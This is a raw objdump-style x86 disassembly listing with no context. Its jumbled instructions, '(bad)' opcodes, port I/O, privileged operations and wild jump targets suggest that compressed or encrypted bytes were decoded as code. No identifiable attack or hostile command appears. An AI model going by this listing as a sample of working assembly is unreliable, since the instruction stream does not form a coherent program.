  416972:	idiv   BYTE PTR [ebp+edx*8-0x49]
  416976:	add    BYTE PTR [edx],al
  416978:	pop    eax
  416979:	inc    ecx
  41697a:	xor    eax,0x6270b41a
  41697f:	lods   eax,DWORD PTR ds:[esi]
  416980:	shr    BYTE PTR [edx-0x71],1
  416983:	jne    0x4169ed
  416985:	adc    DWORD PTR [eax+0x372394b8],ecx
  41698b:	jo     0x4169c3
  41698d:	shl    BYTE PTR ds:0xa3945afc,cl
  416993:	sbb    al,0x32
  416995:	mov    ebp,0x2ff7e407
  41699a:	xchg   ebx,eax
  41699b:	and    DWORD PTR [edi+0x27],edi
  41699e:	ror    DWORD PTR [eax+0x3c436e69],cl
  4169a4:	outs   dx,DWORD PTR ds:[esi]
  4169a5:	lea    ecx,[ecx+esi*1+0x331affa]
  4169ac:	ret    
  4169ad:	and    eax,0x34a21e94
  4169b2:	cmp    BYTE PTR [eax+edx*8-0x6d],0x31
  4169b7:	mov    cl,0xa3
  4169b9:	rcl    BYTE PTR [esi-0x18],1
  4169bc:	in     eax,dx
  4169bd:	xor    eax,0xe5376495
  4169c2:	add    cl,ch
  4169c4:	xchg   esi,eax
  4169c5:	in     al,dx
  4169c6:	xor    al,0xc9
  4169c8:	xor    DWORD PTR [ebx-0x2da4549],eax
  4169ce:	rcr    DWORD PTR [eax+eax*1+0x600761c],1
  4169d5:	or     eax,0xa85421ca
  4169da:	outs   dx,DWORD PTR cs:[esi]
  4169dc:	cmc    
  4169dd:	aad    0x1c
  4169df:	cwde   
  4169e0:	xor    DWORD PTR [edx+0xa4a7f66],ebx
  4169e6:	les    edx,FWORD PTR [edi]
  4169e8:	and    eax,0x903414ac
  4169ed:	rcl    edi,0xdc
  4169f0:	std    
  4169f1:	ror    BYTE PTR [edi],1
  4169f3:	aas    
  4169f4:	jg     0x4169a0
  4169f6:	in     al,0xe3
  4169f8:	aad    0x4b
  4169fa:	int3   
  4169fb:	sbb    DWORD PTR [edi+ecx*1],edi
  4169fe:	repz push ebp
  416a00:	fisttp DWORD PTR [ebp+ebp*8+0x1d9006c5]
  416a07:	adc    cl,al
  416a09:	xor    eax,0xe7ee9882
  416a0e:	add    al,0x9e
  416a10:	adc    cx,WORD PTR [edi+0x2bc2cc37]
  416a17:	nop
  416a18:	jnp    0x416a6e
  416a1a:	adc    cl,BYTE PTR [ebx+0x22bd3ef5]
  416a20:	jno    0x416a84
  416a22:	inc    esp
  416a23:	out    0x4d,al
  416a25:	push   ecx
  416a26:	and    al,0xf3
  416a28:	cmp    BYTE PTR [edi+0x6b],bh
  416a2b:	std    
  416a2c:	aad    0xe
  416a2e:	ror    BYTE PTR [ebx],1
  416a30:	xor    eax,0x38c318ed
  416a35:	add    DWORD PTR ds:0x5e7e627d,esi
  416a3b:	pop    edx
  416a3c:	dec    edi
  416a3d:	scas   al,BYTE PTR es:[edi]
  416a3e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416a3f:	xchg   edi,ebx
  416a41:	stos   BYTE PTR es:[edi],al
  416a42:	sbb    eax,0x4162cc9e
  416a47:	shr    DWORD PTR fs:[ebx],1
  416a4a:	sub    BYTE PTR [eax+0x6a],0xd7
  416a4e:	(bad)  [ebp+0x43e07c77]
  416a54:	inc    esi
  416a55:	and    al,0x60
  416a57:	mov    edi,0xea89530f
  416a5c:	stos   BYTE PTR es:[edi],al
  416a5d:	sahf   
  416a5e:	leave  
  416a5f:	adc    eax,0x898dddc
  416a64:	arpl   di,di
  416a66:	dec    ebx
  416a67:	jl     0x416a95
  416a69:	ds (bad) 
  416a6b:	pop    edi
  416a6c:	or     eax,0x28
	...
  416ad5:	add    bl,cl
  416ad7:	pusha  
  416ad8:	ror    BYTE PTR [ebx+0x60dbbbfb],1
  416ade:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416adf:	mov    al,ds:0x7afc0ba3
  416ae4:	pushf  
  416ae5:	(bad)  
  416ae6:	addr16 hlt 
  416ae8:	add    BYTE PTR [eax],al
  416aea:	add    BYTE PTR [ecx],al
  416aec:	add    BYTE PTR [eax],al
  416aee:	repz sub ch,BYTE PTR [ecx+0x1c]
  416af2:	shl    BYTE PTR [ebp-0x80],0x67
  416af6:	fnstsw WORD PTR [edi+0x71]
  416af9:	and    al,0x72
  416afb:	xchg   ebp,eax
  416afc:	out    dx,al
  416afd:	push   esp
  416afe:	(bad)  
  416aff:	cdq    
  416b00:	jo     0x416ac6
  416b02:	pushf  
  416b03:	push   eax
  416b04:	inc    edx
  416b05:	sbb    BYTE PTR [eax],bl
  416b07:	clc    
  416b08:	(bad)  
  416b09:	mov    ebp,0x4a737f76
  416b0e:	jmp    0x6f0a47a6
  416b13:	push   eax
  416b14:	repnz (bad) 
  416b16:	iret   
  416b17:	fnstcw WORD PTR [eax]
  416b19:	jbe    0x416ae5
  416b1b:	dec    edi
  416b1c:	mov    al,ds:0xd09e9994
  416b21:	enter  0x61c3,0x7c
  416b25:	ins    DWORD PTR es:[edi],dx
  416b26:	inc    edi
  416b27:	xor    dh,BYTE PTR [esp+esi*2+0x2495021d]
  416b2e:	sub    DWORD PTR [ebp+0x6a0b3f27],edi
  416b34:	pushf  
  416b35:	pcmpeqd mm5,mm2
  416b38:	sub    eax,0xa0fed416
  416b3d:	call   0x7d233ce5
  416b42:	mov    ch,0xa2
  416b44:	out    0x4b,eax
  416b46:	push   ebx
  416b47:	jnp    0x416b53
  416b49:	imul   edi,ecx,0xffffffc7
  416b4c:	mov    bl,0x10
  416b4e:	or     DWORD PTR [ecx-0x4585eecb],edi
  416b54:	xor    eax,0xdf08bf77
  416b59:	or     eax,0xd3e8f0ea
  416b5e:	test   eax,0x13670797
  416b63:	push   0x2a6af0e
  416b68:	fwait
  416b69:	in     al,0xbb
  416b6b:	mov    ah,0xf3
  416b6d:	push   ds
  416b6e:	xor    eax,0x1c5a646a
  416b73:	jnp    0x416b69
  416b75:	nop
  416b76:	pop    esi
  416b77:	aad    0xbc
  416b79:	mov    bh,0xd6
  416b7b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416b7c:	mov    DWORD PTR [eax],ebx
  416b7e:	dec    ebp
  416b7f:	lods   al,BYTE PTR ds:[esi]
  416b80:	lahf   
  416b81:	mov    esp,0xe8888ca
  416b86:	cli    
  416b87:	ins    DWORD PTR es:[edi],dx
  416b88:	ins    DWORD PTR es:[edi],dx
  416b89:	lea    ebx,[ebp+0x3f]
  416b8c:	or     ebx,DWORD PTR [ebx]
  416b8e:	pushf  
  416b8f:	xor    al,0xfe
  416b91:	loopne 0x416bfd
  416b93:	mov    al,0xbf
  416b95:	(bad)  
  416b97:	loop   0x416bc1
  416b99:	or     al,0x6c
  416b9b:	push   ebp
  416b9c:	push   esp
  416b9d:	sub    eax,0x73c3a2cf
  416ba2:	rcl    BYTE PTR [edi-0x87e6d4d],cl
  416ba8:	ins    BYTE PTR es:[edi],dx
  416ba9:	add    eax,0xe835b7ce
  416bae:	sub    al,0x8b
  416bb0:	mov    edi,DWORD PTR [eax+0x51d24658]
  416bb6:	loop   0x416bcb
  416bb8:	push   ebx
  416bb9:	aas    
  416bba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416bbb:	sti    
  416bbc:	ja     0x416c0f
  416bbe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416bbf:	inc    ebx
  416bc0:	ret    0x196f
  416bc3:	mov    bl,0x76
  416bc5:	sub    cl,cl
  416bc7:	les    ebp,FWORD PTR [ecx+0x50]
  416bca:	scas   al,BYTE PTR es:[edi]
  416bcb:	sub    eax,0x2bb7a416
  416bd0:	aas    
  416bd1:	or     ebp,eax
  416bd3:	stos   BYTE PTR es:[edi],al
  416bd4:	sub    al,bh
  416bd6:	stc    
  416bd7:	sub    dl,bl
  416bd9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416bda:	sub    eax,0xc1c368ad
  416bdf:	jns    0x416c60
  416be1:	fwait
  416be2:	aam    0x23
  416be4:	sahf   
  416be5:	jnp    0x416c55
  416be7:	jns    0x416c51
  416be9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416bea:	inc    edi
  416beb:	ins    BYTE PTR es:[edi],dx
  416bec:	out    0x36,al
	...
  416c56:	jecxz  0x416cbd
  416c58:	push   cs
  416c59:	test   DWORD PTR [esi-0x38a0401],0x645b70a9
  416c63:	push   eax
  416c64:	mov    eax,ds:0xf56708
  416c69:	add    BYTE PTR [eax],al
  416c6b:	add    DWORD PTR [eax],eax
  416c6d:	add    BYTE PTR [esp+edx*2+0x3d],bl
  416c71:	retf   
  416c72:	iret   
  416c73:	out    dx,al
  416c74:	nop
  416c75:	cmc    
  416c76:	in     eax,dx
  416c77:	int3   
  416c78:	jle    0x416c3c
  416c7a:	push   0x56162275
  416c7f:	sahf   
  416c80:	out    dx,al
  416c81:	(bad)  [ecx]
  416c83:	push   ecx
  416c84:	jl     0x416c47
  416c86:	cmp    DWORD PTR ss:[edi+0x34],ebp
  416c8a:	cmc    
  416c8b:	xor    BYTE PTR ds:0x73c75db7,ah
  416c91:	ds jl  0x416d0b
  416c94:	out    dx,al
  416c95:	(bad)  
  416c96:	(bad)  
  416c97:	cmp    DWORD PTR [ecx+edx*4+0x52ebc8e4],esi
  416c9e:	(bad)  
  416c9f:	int    0xb7
  416ca1:	outs   dx,DWORD PTR ds:[esi]
  416ca2:	leave  
  416ca3:	inc    ecx
  416ca4:	mov    db2,ebp
  416ca7:	pusha  
  416ca8:	xchg   ebp,eax
  416ca9:	fistp  WORD PTR [esi-0x6abd535]
  416caf:	test   eax,0xef553eb0
  416cb4:	inc    edx
  416cb5:	jl     0x416d15
  416cb7:	sti    
  416cb8:	cdq    
  416cb9:	inc    edi
  416cba:	stos   DWORD PTR es:[edi],eax
  416cbb:	ins    DWORD PTR es:[edi],dx
  416cbc:	dec    edx
  416cbd:	mov    ecx,0x64b0a8a5
  416cc2:	neg    BYTE PTR [ecx]
  416cc4:	inc    ebx
  416cc5:	sbb    ch,BYTE PTR [ecx+0x7cc7d3ba]
  416ccb:	and    al,0xfa
  416ccd:	sub    esp,DWORD PTR [ebx+0x44]
  416cd0:	sbb    bl,BYTE PTR [eax+ebp*8+0x0]
  416cd4:	(bad)  
  416cd5:	out    0xd7,al
  416cd7:	test   eax,0x728d44f4
  416cdc:	gs stos DWORD PTR es:[edi],eax
  416cde:	sub    eax,0xa969e10b
  416ce3:	lock int 0x52
  416ce6:	add    edx,ecx
  416ce8:	sub    eax,DWORD PTR [edx+0x556b5513]
  416cee:	jg     0x416c7a
  416cf0:	loope  0x416cc8
  416cf2:	fdivr  DWORD PTR [edx-0x5f]
  416cf5:	jle    0x416d57
  416cf7:	pop    esi
  416cf8:	and    DWORD PTR [edx],esi
  416cfa:	mov    ds:0x8ca13ef3,al
  416cff:	or     DWORD PTR [edx+edi*2-0x629bbc6d],0xdb3694ba
  416d0a:	pop    esp
  416d0b:	enter  0xddf0,0xec
  416d0f:	adc    ah,al
  416d11:	xchg   ebp,eax
  416d12:	outs   dx,BYTE PTR ds:[esi]
  416d13:	in     eax,dx
  416d14:	add    BYTE PTR [ebx+esi*2],0x93
  416d18:	sbb    DWORD PTR [ebp+0x4e605224],edx
  416d1e:	shl    DWORD PTR [ebx],cl
  416d20:	adc    eax,0xa57d79d1
  416d25:	test   al,0x89
  416d27:	mov    dl,BYTE PTR [eax]
  416d29:	aas    
  416d2a:	in     eax,0x36
  416d2c:	push   edx
  416d2d:	mov    esp,DWORD PTR [esi]
  416d2f:	mov    eax,ds:0x3e2e5ce4
  416d34:	xchg   esi,eax
  416d35:	je     0x416d5c
  416d37:	push   ebx
  416d38:	ins    DWORD PTR es:[edi],dx
  416d39:	jb     0x416da3
  416d3b:	cmp    eax,0x129780a9
  416d40:	ins    BYTE PTR es:[edi],dx
  416d41:	shl    DWORD PTR [edi+ebp*2+0x57],1
  416d45:	in     al,0x92
  416d47:	jno    0x416dc8
  416d49:	rcl    DWORD PTR [edi+0x23],cl
  416d4c:	and    edi,DWORD PTR [edx]
  416d4e:	cmp    DWORD PTR [ecx+0x2d1979f3],ecx
  416d54:	xor    al,0x21
  416d56:	out    dx,eax
  416d57:	inc    ebp
  416d58:	push   0xffffff8f
  416d5a:	mov    esp,0x42061b36
  416d5f:	cmp    eax,0x474f5a44
  416d64:	call   0x66ae:0x7e1a9baf
  416d6b:	popa   
  416d6c:	push   eax
  416d6d:	std    
	...
  416dd6:	and    DWORD PTR [ebx-0x40445077],edx
  416ddc:	daa    
  416ddd:	lahf   
  416dde:	mov    ch,0x99
  416de0:	pop    edx
  416de1:	das    
  416de2:	test   DWORD PTR [edx+0x43],esp
  416de5:	inc    esp
  416de6:	test   BYTE PTR [bx+si],0x0
  416dea:	add    BYTE PTR [ecx],al
  416dec:	add    BYTE PTR [eax],al
  416dee:	es je  0x416dae
  416df1:	cmp    al,0x69
  416df3:	mov    cl,0xf4
  416df5:	scas   eax,DWORD PTR es:[edi]
  416df6:	mov    cl,0xb0
  416df8:	stos   DWORD PTR es:[edi],eax
  416df9:	shl    bh,1
  416dfb:	nop
  416dfc:	(bad)  
  416dfd:	jmp    0x67cd282c
  416e02:	stos   BYTE PTR es:[edi],al
  416e03:	mov    ch,BYTE PTR [edi+0x7a]
  416e06:	mov    ebp,0x9423466c
  416e0b:	mov    eax,ds:0x8c177d83
  416e10:	into   
  416e11:	ret    
  416e12:	loope  0x416e74
  416e14:	lahf   
  416e15:	lock outs dx,BYTE PTR ds:[esi]
  416e17:	and    BYTE PTR [edi+edx*4],dl
  416e1a:	cmc    
  416e1b:	in     al,dx
  416e1c:	or     edi,0x3a
  416e1f:	out    dx,al
  416e20:	jle    0x416e8f
  416e22:	in     al,dx
  416e23:	loop   0x416dbe
  416e25:	and    edx,DWORD PTR [ebx]
  416e27:	je     0x416deb
  416e29:	xor    DWORD PTR [edi],0xc9ba76d2
  416e2f:	xor    BYTE PTR [edi+edi*4-0x65],0xcf
  416e34:	xchg   ebp,eax
  416e35:	(bad)  
  416e37:	fcomp  DWORD PTR [esp+eax*2+0x618fdc8a]
  416e3e:	push   ecx
  416e3f:	xor    eax,0x6962dd99
  416e44:	fisubr DWORD PTR [edi+0x0]
  416e47:	dec    ecx
  416e48:	sub    eax,ebp
  416e4a:	dec    eax
  416e4b:	sub    ebx,ecx
  416e4d:	xor    bl,al
  416e4f:	std    
  416e50:	push   ebp
  416e52:	or     DWORD PTR [esi+0x36],ebp
  416e55:	cld    
  416e56:	sub    ebx,DWORD PTR [ecx-0x5b65de04]
  416e5c:	and    eax,0x9fccf945
  416e61:	add    ebp,DWORD PTR [esi]
  416e63:	or     DWORD PTR [edi],ecx
  416e65:	mov    ds:0xdd61775a,eax
  416e6a:	rcr    edx,1
  416e6c:	sub    eax,0x24d7b250
  416e71:	cmp    ah,0x93
  416e74:	adc    DWORD PTR [ebx+0x73],esi
  416e77:	add    DWORD PTR [esi],ecx
  416e79:	sbb    DWORD PTR [ecx-0x7c61869a],ebx
  416e7f:	inc    ebx
  416e80:	xchg   ecx,eax
  416e81:	xchg   DWORD PTR [ecx+0x7f],ebx
  416e84:	(bad)  
  416e85:	mov    bl,0x4b
  416e87:	cs or  al,bl
  416e8a:	add    al,0x31
  416e8c:	retf   0x1b63
  416e8f:	and    DWORD PTR [edi-0x2442c126],ebp
  416e95:	inc    ebx
  416e96:	(bad)  
  416e97:	mov    edi,0xffcd5977
  416e9c:	in     al,0x75
  416e9e:	cmp    BYTE PTR [ebx+0x54d48afc],ch
  416ea4:	cld    
  416ea5:	or     eax,0x73d1df5
  416eaa:	push   ebx
  416eab:	dec    DWORD PTR [ebp+0x6c]
  416eae:	sub    DWORD PTR [ecx-0x70],esp
  416eb1:	cmp    al,0x2d
  416eb3:	call   0xe4ac3b38
  416eb8:	sub    eax,edx
  416eba:	mov    edx,0xdd26b201
  416ebf:	cmp    eax,0x166a8176
  416ec4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416ec5:	xchg   edx,esi
  416ec7:	data16 or BYTE PTR fs:[ebx+esi*8],ch
  416ecc:	push   0xbe06119b
  416ed1:	repz es mov eax,0x3fd484f9
  416ed8:	call   0xac91cd6d
  416edd:	mov    esi,0x5af9b56d
  416ee2:	mov    al,ds:0xba9bfc1d
  416ee7:	out    0xf9,al
  416ee9:	mov    dl,0xb7
  416eeb:	das    
  416eec:	lea    ebp,[eax+eax*1+0x0]
	...
  416f54:	add    BYTE PTR [eax],al
  416f56:	mov    edi,0xae6d8e19
  416f5b:	(bad)  
  416f5c:	(bad)  
  416f5d:	fucomi st,st(0)
  416f5f:	xor    eax,0x431e8eea
  416f64:	adc    cl,cl
  416f66:	test   DWORD PTR [bx+si],0x10000
  416f6d:	add    BYTE PTR [ecx+0x9a4a62d],dh
  416f73:	outs   dx,BYTE PTR ds:[esi]
  416f74:	push   cs
  416f75:	daa    
  416f76:	call   0x94938459
  416f7b:	arpl   WORD PTR [ecx],sp
  416f7d:	cmc    
  416f7e:	mov    bh,0xf6
  416f80:	sub    ecx,DWORD PTR [ebp+0x2f]
  416f83:	sahf   
  416f84:	(bad)  
  416f85:	xor    al,0xfb
  416f87:	xchg   ebp,eax
  416f88:	xor    DWORD PTR [ebx+0x5c],edi
  416f8b:	and    DWORD PTR [edx-0x4bcd3319],0x3124d142
  416f95:	jb     0x416f2f
  416f97:	out    0x2d,al
  416f99:	xchg   DWORD PTR cs:[ebx+0x75137c4b],ebp
  416fa0:	ins    BYTE PTR es:[edi],dx
  416fa1:	sub    ch,0xb7
  416fa4:	cdq    
  416fa5:	dec    edx
  416fa6:	loop   0x416ff3
  416fa8:	(bad)  
  416fa9:	mov    dl,0x73
  416fab:	sbb    edx,DWORD PTR [ecx+0x307bd987]
  416fb1:	add    ebx,ebp
  416fb3:	xor    edi,ebp
  416fb5:	add    cl,BYTE PTR ds:0xe727c2a4
  416fbb:	cli    
  416fbc:	ret    
  416fbd:	jnp    0x416ff2
  416fbf:	(bad)  
  416fc0:	(bad)  
  416fc1:	and    BYTE PTR [eax-0x7f],bh
  416fc4:	out    0xf9,eax
  416fc6:	mov    bl,0xa8
  416fc8:	or     BYTE PTR [esi-0x7f4e36fd],bh
  416fce:	or     BYTE PTR [edi-0x54],bl
  416fd1:	es in  eax,dx
  416fd3:	lahf   
  416fd4:	sti    
  416fd5:	fwait
  416fd6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416fd7:	mov    DWORD PTR [edx+0x3d],eax
  416fda:	xor    bl,BYTE PTR [ebp-0x77]
  416fdd:	mov    al,0xa9
  416fdf:	scas   al,BYTE PTR es:[edi]
  416fe0:	aaa    
  416fe1:	or     DWORD PTR [edx+0x19],ecx
  416fe4:	scas   eax,DWORD PTR es:[edi]
  416fe5:	rol    ebx,1
  416fe7:	mov    BYTE PTR [ebx-0x4b0b3886],bh
  416fed:	call   0x196344f7
  416ff2:	lahf   
  416ff3:	fnop   
  416ff5:	das    
  416ff6:	xchg   ebx,eax
  416ff7:	add    DWORD PTR [ebx],0x4f
  416ffa:	jns    0x417054
  416ffc:	popa   
  416ffd:	into   
  416ffe:	shl    DWORD PTR fs:[edi],1
  417001:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417002:	and    al,0x7
  417004:	fdiv   DWORD PTR [ecx+0x660af8d5]
  41700a:	xor    al,0xc0
  41700c:	in     al,dx
  41700d:	into   
  41700e:	mov    ds:0x9d6f319a,eax
  417013:	mov    al,ds:0x1eaeb5c7
  417018:	stos   BYTE PTR es:[edi],al
  417019:	scas   eax,DWORD PTR es:[edi]
  41701a:	cmp    eax,0xc55bb3ef
  41701f:	out    0x8c,al
  417021:	pop    esi
  417022:	xor    BYTE PTR [ebx],dh
  417024:	in     al,dx
  417025:	adc    dh,0xfa
  417028:	jns    0x417099
  41702a:	repz scas eax,DWORD PTR es:[edi]
  41702c:	(bad)  
  41702e:	and    eax,ebx
  417030:	test   ebx,0x78cbe811
  417036:	mov    dl,0x9b
  417038:	ss cwde 
  41703a:	cld    
  41703b:	jno    0x416fe5
  41703d:	xor    ebx,ecx
  41703f:	inc    ecx
  417040:	mov    ecx,0x1dd80ef3
  417045:	inc    ecx
  417046:	mov    eax,0x6958af40
  41704b:	lds    edi,FWORD PTR [ebx-0x66]
  41704e:	push   ebp
  41704f:	test   DWORD PTR fs:0x5a5690d7,0xa43d7303
  41705a:	cmp    eax,0x36763f46
  41705f:	add    DWORD PTR ds:[eax-0x3a66cdaa],edi
  417066:	add    BYTE PTR [ebp-0x5b1fcdee],dh
  41706c:	enter  0xb6,0x0
	...
  4170d4:	add    BYTE PTR [eax],al
  4170d6:	jbe    0x417105
  4170d8:	push   ebp
  4170d9:	inc    ecx
  4170da:	pop    edi
  4170db:	jns    0x417153
  4170dd:	aas    
  4170de:	(bad)  
  4170df:	loopne 0x4170d5
  4170e1:	sub    ebx,esp
  4170e3:	adc    eax,0xf8675119
  4170e8:	add    BYTE PTR [eax],al
  4170ea:	add    BYTE PTR [ecx],al
  4170ec:	add    BYTE PTR [eax],al
  4170ee:	mov    edx,0x94737be6
  4170f3:	fld    QWORD PTR ds:0x355d67a2
  4170f9:	addr16 mov bl,0x49
  4170fc:	push   es
  4170fd:	xchg   al,bh
  4170ff:	pop    ss
  417100:	xlat   BYTE PTR ds:[ebx]
  417101:	shr    BYTE PTR [eax],0x96
  417104:	(bad)  
  417106:	cmp    esi,eax
  417108:	push   ds
  417109:	inc    ebx
  41710a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41710b:	xchg   BYTE PTR [ebx+0xc],al
  41710e:	xor    al,0x13
  417110:	jl     0x417152
  417112:	outs   dx,DWORD PTR ds:[esi]
  417113:	clc    
  417114:	xchg   ebp,eax
  417115:	in     al,0x3e
  417117:	jmp    FWORD PTR [eax-0x768c6a4]
  41711d:	and    DWORD PTR [edi-0x64],esi
  417120:	icebp  
  417121:	std    
  417122:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417123:	aaa    
  417124:	popa   
  417125:	push   es
  417126:	inc    ecx
  417127:	test   DWORD PTR [esi-0x18987983],edx
  41712d:	cmovp  ebp,edi
  417130:	adc    esi,edi
  417132:	xchg   cl,al
  417134:	ds loope 0x4170f3
  417137:	fstp   TBYTE PTR [eax+0x79cf5e3f]
  41713d:	rcl    DWORD PTR [ecx-0x1c],1
  417140:	lahf   
  417141:	icebp  
  417142:	aam    0x8a
  417144:	imul   ecx,DWORD PTR [edi-0x42],0x6d
  417148:	(bad)  
  417149:	loope  0x417137
  41714b:	and    DWORD PTR [edx+0x308c229b],edx
  417151:	popf   
  417152:	mov    esp,0x43c4266f
  417157:	(bad)  [edi+edi*2]
  41715a:	pusha  
  41715b:	idiv   esp
  41715d:	fldenv [ecx-0x63]
  417160:	push   ebx
  417161:	mov    dl,0x46
  417163:	inc    ebx
  417164:	jmp    FWORD PTR [edx-0x553f420]
  41716a:	in     eax,0xe8
  41716c:	stc    
  41716d:	sub    eax,DWORD PTR [esi+0x7aa98e50]
  417173:	mov    ah,0xb
  417175:	lahf   
  417176:	(bad)  
  417177:	daa    
  417178:	cmp    ebp,ebp
  41717a:	inc    eax
  41717b:	in     al,0xb7
  41717d:	push   ebx
  41717e:	adc    eax,0x64e944d6
  417183:	div    DWORD PTR [edx-0x7a48e8a6]
  417189:	sbb    al,0x33
  41718b:	es push ebp
  41718d:	pop    edx
  41718e:	ffree  st(0)
  417190:	jmp    0xf811f7b3
  417195:	daa    
  417196:	xchg   ebp,eax
  417197:	repz (bad) 
  417199:	mov    al,0x55
  41719b:	fld    st(3)
  41719d:	ds inc esp
  41719f:	ds aad 0x40
  4171a2:	fmul   QWORD PTR [esi+ebp*1]
  4171a5:	fwait
  4171a6:	(bad)
  4171a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4171aa:	(bad)  
  4171ab:	cmp    bl,BYTE PTR [ebx-0x79dd7671]
  4171b1:	xchg   esi,eax
  4171b2:	fmul   st(0),st
  4171b4:	xchg   edx,eax
  4171b5:	jb     0x41715d
  4171b7:	ret    0xe368
  4171ba:	push   0x48
  4171bc:	mov    edx,0x7faa6ea2
  4171c1:	cwde   
  4171c2:	push   ds
  4171c3:	mov    ebx,0xd705c3f8
  4171c8:	jae    0x417190
  4171ca:	push   ebx
  4171cb:	jl     0x417229
  4171cd:	jl     0x41721d
  4171cf:	add    al,0x8f
  4171d1:	in     al,dx
  4171d2:	push   ebp
  4171d3:	xor    ch,bl
  4171d5:	or     DWORD PTR [ecx],ecx
  4171d7:	int    0x89
  4171d9:	inc    esp
  4171da:	fdivr  QWORD PTR [ebx+eax*1+0x5d]
  4171de:	and    al,0x28
  4171e0:	sub    BYTE PTR [esi-0x72356c7d],ch
  4171e6:	adc    ebp,DWORD PTR [esi]
  4171e8:	clc    
  4171e9:	and    al,0xfb
  4171eb:	inc    esp
  4171ec:	lods   al,BYTE PTR ds:[esi]
  4171ed:	push   es
	...
  417256:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417257:	sbb    DWORD PTR [eax+0x1a],esi
  41725a:	(bad)  
  41725b:	jnp    0x41724b
  41725d:	mov    ebp,0x986526a4
  417262:	fwait
  417263:	pop    ebx
  417264:	ja     0x417289
  417266:	addr16 stc 
  417268:	add    BYTE PTR [eax],al
  41726a:	add    BYTE PTR [ecx],al
  41726c:	add    BYTE PTR [eax],al
  41726e:	scas   eax,DWORD PTR es:[edi]
  41726f:	test   eax,0x6095b262
  417274:	fmul   st,st(2)
  417276:	pop    edi
  417277:	clc    
  417278:	jno    0x4172ab
  41727a:	adc    eax,0x3ffc4708
  41727f:	je     0x4172da
  417281:	mov    edi,cs
  417283:	out    dx,eax
  417284:	int3   
  417285:	jnp    0x417211
  417287:	mov    edi,0x6ce66273
  41728c:	jno    0x4172d4
  41728e:	outs   dx,DWORD PTR ds:[esi]
  41728f:	mov    cl,0x4a
  417291:	loope  0x417245
  417293:	and    ebx,DWORD PTR [eax+0x23]
  417296:	and    DWORD PTR [esi-0x639d50f6],ecx
  41729c:	icebp  
  41729d:	sub    BYTE PTR [ecx],0xc1
  4172a0:	jae    0x41728d
  4172a2:	jo     0x417285
  4172a4:	test   eax,0x1518083
  4172a9:	sti    
  4172aa:	pusha  
  4172ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4172ac:	mov    ebx,0xb7a2c8cd
  4172b1:	dec    BYTE PTR ds:0x3bef4f15
  4172b7:	leave  
  4172b8:	ja     0x41727a
  4172ba:	dec    esp
  4172bb:	or     eax,0x3eff7e76
  4172c0:	xchg   edi,eax
  4172c1:	in     al,0xda
  4172c3:	push   ebx
  4172c4:	aad    0x10
  4172c6:	and    DWORD PTR [esi+0x644ec1ba],ecx
  4172cc:	pop    ss
  4172cd:	or     DWORD PTR [ebp+0x4b],ebx
  4172d0:	cdq    
  4172d1:	and    BYTE PTR [ebx-0xe],dl
  4172d4:	xor    BYTE PTR [ecx],ch
  4172d6:	es mov cl,0xfa
  4172d9:	xor    DWORD PTR [eax+0xc],ecx
  4172dc:	mov    esp,0xf38d1be9
  4172e1:	push   ss
  4172e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4172e3:	or     ebx,DWORD PTR [esi+0x5e]
  4172e6:	adc    eax,0x970c4b18
  4172eb:	cmp    al,0x7a
  4172ed:	pusha  
  4172ee:	imul   ecx,DWORD PTR [ecx+ebx*1+0x1e],0xb9d53efa
  4172f6:	cwde   
  4172f7:	fmul   DWORD PTR [esi-0x6b180611]
  4172fd:	sub    DWORD PTR [edi+0x23],ebx
  417300:	scas   al,BYTE PTR es:[edi]
  417301:	cld    
  417302:	bound  ebx,QWORD PTR [esi+0x2b]
  417305:	adc    dh,BYTE PTR [edx-0xdb8642f]
  41730b:	cmp    BYTE PTR [edx-0x4b],dh
  41730e:	mov    ecx,0x4fef8ac5
  417313:	scas   al,BYTE PTR es:[edi]
  417314:	les    esp,FWORD PTR [ecx+ecx*8+0x6]
  417318:	dec    ebp
  417319:	pusha  
  41731a:	sub    dl,bh
  41731c:	pop    esp
  41731d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41731e:	retf   
  41731f:	cmp    eax,esi
  417321:	inc    ebx
  417322:	stos   DWORD PTR es:[edi],eax
  417323:	fpatan 
  417325:	mov    ss,edi
  417327:	adc    DWORD PTR [esi+0x569415b1],esi
  41732d:	sbb    bh,ch
  41732f:	mov    eax,ds:0xac94358f
  417334:	scas   al,BYTE PTR es:[edi]
  417335:	sar    ch,cl
  417337:	sub    ecx,DWORD PTR [eax]
  417339:	jne    0x4172cb
  41733b:	xchg   esp,eax
  41733c:	cmc    
  41733d:	jns    0x41732c
  41733f:	push   esi
  417340:	sbb    al,0x76
  417342:	out    dx,al
  417343:	ins    DWORD PTR es:[edi],dx
  417344:	push   ecx
  417345:	lods   eax,DWORD PTR ds:[esi]
  417346:	adc    eax,0x2d10a66b
  41734b:	mov    edi,0x23130877
  417350:	or     BYTE PTR [ebp-0x2f282e63],ch
  417356:	sbb    ebp,ecx
  417358:	test   BYTE PTR [eax+0x22],0x48
  41735c:	push   ds
  41735d:	xor    eax,eax
  41735f:	loopne 0x41732e
  417361:	das    
  417362:	out    dx,al
  417363:	jbe    0x41738b
  417365:	gs out 0xbd,al
  417368:	sbb    eax,0x1e62a412
  41736d:	sbb    DWORD PTR [eax],eax
	...
  4173d3:	add    BYTE PTR [eax],al
  4173d5:	add    BYTE PTR [ecx-0x44],ch
  4173d8:	xlat   BYTE PTR ds:[ebx]
  4173d9:	pop    esi
  4173da:	xlat   BYTE PTR ds:[ebx]
  4173db:	jg     0x4173c6
